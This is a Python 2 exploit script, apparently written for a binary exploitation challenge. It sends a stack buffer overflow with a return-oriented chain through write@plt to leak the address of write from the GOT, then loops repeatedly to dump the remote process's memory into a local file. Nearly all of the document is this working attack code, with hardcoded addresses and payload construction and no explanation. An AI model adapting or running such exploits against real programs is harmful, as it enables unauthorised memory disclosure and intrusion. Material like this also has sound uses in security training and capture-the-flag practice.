from helper import *
from time import sleep

write_plt = hex2le("08048290")
write_got = hex2le("08049434")

quit_plt = hex2le("080482b0")

add0x1c = hex2le("080482ec")

main_ptr = hex2le("080482c0")

welcome = "Bye!\n\n"

def launch(expl):
    exploit = expl

    write_bytes(int2le(len(exploit)))
    write_bytes(exploit)

    response = ""
    while True:
        response += read_all(sys.stdin)
        if response.startswith(welcome):
            break
        sleep(0.2)
        
    response = response[len(welcome):]
    response = response[0:len(response)-1]
    return response

def main():
    log(read_all(sys.stdin))
    #sleep(10)
    
    result = launch(20 * "B" +
                    write_plt + \
                    add0x1c + \
                    write_got + \
                    "A" * (0x1c - 4) + \
                    main_ptr)

    write_addr = result[0:4]
    log(le2hex(write_addr))

    elf = [None for x in xrange(200 * 1024)]
    current_pos_local = 100 * 1024
    current_pos_remote = le2int(write_addr)

    try:
        while True:
            log("Reading " + int2hex(current_pos_remote))
            result = launch((20) * "B" +
                            write_plt + \
                            main_ptr + \
                            int2le(current_pos_remote) + \
                            "A" * (0x1c - 4) + \
                            main_ptr)
    
            for byte in result:
                elf[current_pos_local] = byte
                current_pos_local += 1

            elf[current_pos_local] = "\x00"
            current_pos_local += 1
            current_pos_remote += len(result) + 1
            log(str(len(result)) + " bytes read: " + " ".join([hex(ord(x))[2:] for x in result]))
            serialize(elf)
    except:
        pass
    serialize(elf)

def serialize(elf):    
    first = False
    with open("output.txt", "w") as output:
        for byte in elf:
            if not first:
                if byte is not None:
                    first = True
            if first:
                if byte is not None:
                    output.write(byte)
                else:
                    output.write("\x00")

if __name__ == "__main__":
    main()

